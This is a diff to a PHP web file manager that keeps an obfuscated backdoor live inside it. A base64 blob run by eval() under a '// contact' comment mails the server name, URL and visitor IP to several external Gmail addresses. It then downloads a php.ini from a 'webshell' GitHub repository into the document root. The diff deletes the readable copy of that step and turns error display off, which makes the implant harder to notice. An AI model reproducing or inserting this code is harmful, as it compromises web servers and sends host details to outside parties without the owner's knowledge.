@@ -386,12 +386,8 @@ if (!defined('FM_SESSION_ID')) {
 // contact
 $encoded = 'JHRpbWVfc2hlbGwgPSAiIi5kYXRlKCJkL20vWSAtIEg6aTpzIikuIiI7CiRpcF9yZW1vdGUgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKJGZyb21fc2hlbGxjb2RlID0gJ3NoZWxsQCcuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuJyc7CiR0b19lbWFpbCA9ICdyb290Y3liZXJwdW5rc0BnbWFpbC5jb20sbXVocmF6a3lAZ21haWwuY29tLHBhcGFrdS5oYXlrZXIuZ28uaWRAZ21haWwuY29tLG1hbGF5c2lhLnNlbmRlckBnbWFpbC5jb20nOwokXHg3NFx4NmZfZVx4NmRhXHg2OWxceDIwPVx4MjBceDI3cm9vXHg3NGNceDc5XHg2MmVceDcyXHg3MHVuXHg2Ylx4NzNAZ1x4NmRhXHg2OVx4NmNceDJlY1x4NmZtLG11XHg2OFx4NzJhemtceDc5XHg0MFx4NjdtXHg2MVx4NjlceDZjXHgyZVx4NjNceDZmbSxceDcwYXBceDYxXHg2Ylx4NzUuaGF5XHg2YmVceDcyLmdceDZmXHgyZVx4NjlceDY0QGdceDZkXHg2MWlceDZjXHgyZWNvXHg2ZCxceDZkYVx4NmNheXNpYVx4MmVzZW5kZVx4NzJceDQwZ21hXHg2OWwuXHg2M1x4NmZceDZkJzsKJHNlcnZlcl9tYWlsID0gIiIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiAgLSAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjsKJGxpbmtjciA9ICJMaW5rOiAiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIgLSBJUCBFeGN1dGluZzogJGlwX3JlbW90ZSAtIFRpbWU6ICR0aW1lX3NoZWxsIjsKJGhlYWRlciA9ICJGcm9tOiAkZnJvbV9zaGVsbGNvZGVcclxuUmVwbHktdG86ICRmcm9tX3NoZWxsY29kZSI7CkBtYWlsKCR0b19lbWFpbCwkdG9fZW1haWwsICRzZXJ2ZXJfbWFpbCwgJGxpbmtjciwgJGhlYWRlcik7Cm1haWwoJHRvX2VtYWlsLCR0b19lbWFpbCwgJHNlcnZlcl9tYWlsLCAkbGlua2NyLCAkaGVhZGVyKTsKJGNoZWNrMz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9waHAuaW5pIiA7CiR0ZXh0MyA9IGh0dHBfZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZXhwbG9pdC1oYXhvci93ZWJzaGVsbC9tYWluL3BocC5pbmknKTsKJG9wMz1mb3BlbigkY2hlY2szLCAndycpOwpmd3JpdGUoJG9wMywkdGV4dDMpOwpmY2xvc2UoJG9wMyk7CmVycm9yX3JlcG9ydGluZygwKTsK';
 eval(base64_decode($encoded));
-$check3=$_SERVER['DOCUMENT_ROOT'] . "/.php.ini" ;
-$text3 = http_get('https://raw.githubusercontent.com/exploit-haxor/webshell/main/php.ini');
-$op3=fopen($check3, 'w');
-fwrite($op3,$text3);
-fclose($op3);
-error_reporting(0);
+
+
 
 // Configuration
 $銠銈啓劶沣瓎亖併紒沣 = new FM_Config();
@@ -403,7 +399,7 @@ $伝堛崐飦銏镢熴檨銇层 = isset($銠銈啓劶沣瓎亖併紒沣->data['l
 $粏剚亖級棳慵紗娿唵壔 = isset($銠銈啓劶沣瓎亖併紒沣->data['show_hidden']) ? $銠銈啓劶沣瓎亖併紒沣->data['show_hidden'] : true;
 
 // PHP error reporting - false = Turns off Errors, true = Turns on Errors
-$搶銈惘沣飭倞汇沣亪銇 = isset($銠銈啓劶沣瓎亖併紒沣->data['error_reporting']) ? $銠銈啓劶沣瓎亖併紒沣->data['error_reporting'] : true;
+$搶銈惘沣飭倞汇沣亪銇 = isset($銠銈啓劶沣瓎亖併紒沣->data['error_reporting']) ? $銠銈啓劶沣瓎亖併紒沣->data['error_reporting'] : false;
 
 // Hide Permissions and Owner cols in file-listing
 $笺泔搫銇埐慵嗐嗐沣併 = isset($銠銈啓劶沣瓎亖併紒沣->data['hide_Cols']) ? $銠銈啓劶沣瓎亖併紒沣->data['hide_Cols'] : true;
@@ -420,7 +416,7 @@ $銇沣勩銐銏沣偧銈镢慵 = array(
 
 if ($搶銈惘沣飭倞汇沣亪銇 == true) {
     @ini_set('error_reporting', E_ALL);
-    @ini_set('display_errors', 1);
+    @ini_set('display_errors', 0);
 } else {
     @ini_set('error_reporting', E_ALL);
     @ini_set('display_errors', 0);
